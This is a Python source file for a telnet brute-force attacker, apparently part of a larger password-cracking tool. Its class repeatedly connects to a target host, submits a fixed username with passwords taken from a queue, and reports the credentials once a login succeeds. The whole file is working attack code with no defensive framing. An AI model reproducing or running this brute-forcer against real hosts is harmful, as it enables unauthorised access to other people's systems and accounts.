import telnetlib
from target import Target, Attacker


class TelnetAttacker(Attacker):
    def __init__(self, target: Target):
        super().__init__(target)

    def run(self):
        while TelnetAttacker.finish is False:
            try:
                tn = telnetlib.Telnet()
                tn.open(self.target.host, self.target.port)
            except ConnectionRefusedError:
                print("[%s] Connection error - %s" % (self.name, self.target.host))
            except Exception:
                print("[%s] Unknown exception while connecting to %s" %
                      (self.name, self.target.host))
            else:
                while TelnetAttacker.finish is False:
                    password = self.get_password()
                    if password is None:
                        continue

                    try:
                        tn.read_until(b"login: ")
                        tn.write(self.target.login.encode('ascii') + b"\n")
                        tn.read_until(b"Password: ")
                        tn.write(password.encode('ascii') + b"\n")
                        result = tn.expect([b"Last login:"], 2)
                    except (EOFError, OSError):
                        print("[%s] Connection error - %s" % (self.name, self.target.host))
                        self.target.passwords.put(password)
                        break
                    else:
                        self.tries += 1
                        if result[0] == -1:
                            print("[%s] Failed attempt against %s - user: %s, password: %s" %
                                  (self.name, self.target.host, self.target.login, password))
                        else:
                            TelnetAttacker.finish = True
                            TelnetAttacker.password = password
                            TelnetAttacker.success = True
                            print("[%s] Found credentials for %s - user: %s, password: %s" %
                                  (self.name, self.target.host, self.target.login, password))
                            break
            finally:
                tn.close()
